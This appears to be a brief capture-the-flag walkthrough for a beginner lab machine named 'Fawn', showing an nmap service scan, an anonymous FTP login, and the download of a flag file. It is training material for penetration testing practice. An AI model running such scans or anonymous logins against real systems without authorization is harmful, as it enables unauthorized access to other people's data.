# FAWN

STARTING POINT - TIER 0

## Enumeration

**Nmap scan**

```bash
nmap -sC -sV 10.129.1.14
```

![nmap](pics/nmap.png)

## Exploitation

**Connect to FTP Server**

```bash
ftp 10.129.1.14
```

**Login without having an account**

- `anonymous`

**List all contents**

```bash
ls
```

![ls](pics/ls.png)

**Download the file**

```bash
get flag.txt
```

![get_file](pics/get_file.png)

**Exit FTP Server and get flag**

```bash
cat flag.txt
```
